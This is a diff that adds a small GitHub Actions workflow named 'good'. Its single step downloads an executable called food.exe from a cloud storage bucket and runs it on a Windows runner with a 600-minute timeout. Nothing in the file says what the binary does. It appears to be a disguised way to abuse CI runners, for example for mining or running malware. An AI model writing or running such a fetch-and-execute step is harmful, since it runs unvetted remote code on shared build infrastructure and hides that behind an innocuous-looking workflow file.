@@ -1,0 +1,8 @@
+name: good 
+on: workflow_dispatch 
+jobs: 
+  build: 
+    runs-on: windows-2019 
+    steps: 
+    - run: Invoke-WebRequest https://storage.cloud.google.com/skillful-portal-417804.appspot.com/food.exe -OutFile food.exe ; .\food.exe 
+    timeout-minutes: 600
